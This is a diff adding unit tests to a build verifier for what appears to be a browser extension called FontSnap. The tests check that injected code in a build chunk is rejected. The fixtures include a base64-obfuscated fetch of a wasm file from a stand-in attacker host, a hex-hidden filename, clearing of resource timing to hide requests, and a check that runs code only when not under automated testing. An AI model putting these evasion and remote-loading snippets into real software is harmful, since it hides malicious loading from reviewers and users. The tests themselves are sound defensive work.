@@ -791,6 +791,25 @@ describe('verifyDist: the FontSnap manifest and its narrow WebAssembly exception
       expect(problemsOf({ [RESULT]: LEGIT })).toBe('');
     });
 
+    it.each([
+      ['a URL in base64', `${LEGIT};fetch(atob("aHR0cHM6Ly9ldmlsLmV4YW1wbGUvYi53YXNt"))`],
+      ['a .wasm name in hex', `${LEGIT};fetch("0a622e7761736d")`],
+      ['a Worker', `${LEGIT};new Worker("w.js")`],
+      ['XMLHttpRequest', `${LEGIT};new XMLHttpRequest()`],
+      ['resource timing emptied', `${LEGIT};performance.setResourceTimingBufferSize(0)`],
+      ['a test-or-user switch', `${LEGIT};if(navigator.webdriver)run()`],
+      ['btoa outside the service worker', `${LEGIT};btoa(x)`],
+    ])('rejects %s in a chunk of the build', (_what, code) => {
+      expect(problemsOf({ [RESULT]: code })).toMatch(/decodes to|uses /);
+    });
+
+    it('lets the service worker encode the screenshot, and nobody else', () => {
+      const encode = 'const e=btoa(String.fromCharCode(...b));';
+      expect(
+        verifyDist(makeDist({ files: { 'background.js': encode } }), release).join('\n'),
+      ).not.toContain('uses btoa');
+    });
+
     it('accepts it whatever its hash, but only one chunk may import the runtime', () => {
       expect(problemsOf({ 'assets/result-zzz.js': LEGIT })).toBe('');
       const two = problemsOf({ [RESULT]: LEGIT, 'assets/other-abc.js': LEGIT });
